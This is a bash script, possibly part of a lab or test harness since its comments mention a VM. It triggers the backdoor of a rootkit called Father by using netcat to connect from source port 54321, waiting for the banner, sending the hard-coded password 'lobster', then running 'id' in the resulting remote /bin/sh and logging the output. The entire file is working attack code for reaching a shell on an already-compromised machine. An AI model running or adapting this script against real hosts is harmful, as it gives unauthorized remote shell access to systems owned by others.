#!/usr/bin/env bash
set -Eeuo pipefail

if [[ "$#" -ne 3 ]]; then
    echo "usage: $0 RESPONSE HOST PORT" >&2
    exit 2
fi

response=$1
host=$2
port=$3
command -v nc >/dev/null 2>&1

# SOURCEPORT is the client port. Keep this pipe open after the bounded input so
# Father's forked /bin/sh and the accepted socket survive until VM shutdown.
coproc FATHER_NC { exec nc -4 -n -p 54321 "$host" "$port" > "$response" 2>&1; }
nc_pid=$FATHER_NC_PID
trap 'kill "$nc_pid" 2>/dev/null || true' EXIT
trap 'exit 1' INT TERM

# Father writes before its one password read. Wait for those first bytes without
# parsing a shell/SSH prompt, then keep `id` out of the authentication read.
for _ in {1..50}; do
    [[ -s "$response" ]] && break
    kill -0 "$nc_pid" 2>/dev/null || break
    sleep 0.1
done
[[ -s "$response" ]]
response_size=$(stat -c %s -- "$response")
printf 'lobster\0' >&"${FATHER_NC[1]}"

# Authentication writes Father's banner before the child replaces itself with
# /bin/sh. Response growth therefore proves the password read has completed.
for _ in {1..50}; do
    new_size=$(stat -c %s -- "$response")
    (( new_size > response_size )) && break
    kill -0 "$nc_pid" 2>/dev/null || break
    sleep 0.1
done
(( new_size > response_size ))
printf 'id\n' >&"${FATHER_NC[1]}"
wait "$nc_pid"
